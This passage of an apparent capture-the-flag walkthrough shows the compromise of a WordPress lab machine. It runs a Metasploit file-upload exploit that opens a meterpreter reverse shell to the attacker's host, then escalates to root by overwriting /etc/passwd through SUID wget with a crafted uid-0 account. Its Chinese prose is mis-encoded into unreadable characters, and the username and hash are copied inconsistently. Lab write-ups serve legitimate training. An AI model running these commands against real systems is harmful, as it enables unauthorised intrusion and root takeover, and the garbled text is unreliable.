 | Readme: http://192.168.32.149/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | [!] The version is out of date, the latest version is 9.1.2
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.32.149/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/, status: 200
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: WP Support Plus Responsive Ticket System  use exploit/unix/webapp/wp_reflexgallery_file_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set rhosts 192.168.32.149
rhosts => 192.168.32.149
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set targeturi /wordpress
targeturi => /wordpress
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
[*] Started reverse TCP handler on 192.168.32.130:4444 
[+] Our payload is at: WIfhFLFPqz.php. Calling payload...
[*] Calling payload...
[*] Sending stage (39282 bytes) to 192.168.32.149
[*] Meterpreter session 1 opened (192.168.32.130:4444 -> 192.168.32.149:46952) at 2022-06-06 21:36:43 -0400
[+] Deleted WIfhFLFPqz.php
meterpreter > shell
Process 12488 created.
Channel 2 created.
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2022/06$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
**æƒé™æå‡**
ä¸€æ—¦æˆ‘ä»¬è·å¾—äº†é€‚å½“çš„å¤–å£³ï¼Œæˆ‘ä»¬å°±æšä¸¾äº†æœºå™¨çš„æ ‡å¿—ã€‚æˆ‘ä»¬åœ¨ /home/raj/ ç›®å½•ä¸‹æ‰¾åˆ° flag1.txt
```
cd /home 
ls 
cd raj 
ls 
cat flag1.txt
aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu
```
ç°åœ¨å¯¹äºæƒé™æå‡ï¼Œå¸¸è§„åšæ³•æ˜¯åœ¨"æŸ¥æ‰¾"å‘½ä»¤çš„å¸®åŠ©ä¸‹æ£€æŸ¥ä»»ä½•å…·æœ‰ SUID æƒé™çš„æ–‡ä»¶ã€‚æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æšä¸¾æ‰€æœ‰å…·æœ‰ SUID æƒé™çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼š
```
find / -perm -u=s -type f 2>/dev/null
```
![image-20220607094251815](../../.gitbook/assets/image-20220607094251815.png)
æŸ¥æ‰¾å‘½ä»¤æ˜¾ç¤º**wget**å’Œ**cp**å‘½ä»¤å…·æœ‰ SUID æƒé™ã€‚è¿™å¯¹äºå‡çº§ root æƒé™æ˜¯å¯èƒ½çš„
SUID Binaries å‘½ä»¤ä¸ºæˆ‘ä»¬æä¾›äº†æ‰€æœ‰å¯ä»¥è¯»/å†™çš„æ•æ„Ÿæ–‡ä»¶ï¼Œå› æ­¤åœ¨ wget å‘½ä»¤çš„å¸®åŠ©ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›– `/etc/passwd`ã€‚  
ç°åœ¨æˆ‘ä»¬æ­£åœ¨ä¸ºæˆ‘ä»¬çš„æ–°ç”¨æˆ·åˆ›å»ºå¯†ç çš„ç›å€¼ï¼Œè¿™å°†é€šè¿‡ä½¿ç”¨"openssl"ä»¥ä¸‹å‘½ä»¤æ¥å®Œæˆï¼Œå¦‚ä¸‹é¢çš„å±å¹•æˆªå›¾æ‰€ç¤ºï¼š
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```
æˆ‘ä»¬å°†å¾—åˆ°ç±»ä¼¼è¿™æ ·çš„å“ˆå¸Œå€¼ï¼š**"$1$ignite$3eTbJm980Hz.k1NTdNxe1"**ï¼›è¿™å°†å¸®åŠ©æˆ‘ä»¬åœ¨ç›®æ ‡æœºå™¨çš„ `/etc/passwd` æ–‡ä»¶ä¸­åˆ›å»ºç”¨æˆ·æ¡ç›®ã€‚ç°åœ¨æˆ‘ä»¬å·²ç»åœ¨æœ¬åœ°æœºå™¨ä¸Šå¤åˆ¶äº† `/etc/passwd` æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚
![image-20220607095653449](../../.gitbook/assets/image-20220607095653449.png)
ç²˜è´´ä¸Šé¢å¤åˆ¶çš„å†…å®¹åï¼Œæˆ‘ä»¬å°†ä¸ºç”¨æˆ·"**ignite**"ç¼–è¾‘ä¸€æ¡æ–°è®°å½•ï¼Œç„¶åå°†ä¸Šé¢å¤åˆ¶çš„å“ˆå¸Œå¯†ç ç²˜è´´åˆ°è®°å½•ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚
```
iqnite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
```
![image-20220607100427511](../../.gitbook/assets/image-20220607100427511.png)
ä¸‹è½½passwdæ–‡ä»¶è¦†ç›–é¶åœºçš„passwdæ–‡ä»¶
![image-20220607100034685](../../.gitbook/assets/image-20220607100034685.png)
ææƒæˆåŠŸ
![image-20230208145757431](../../.gitbook/assets/image-20230208145757431.png)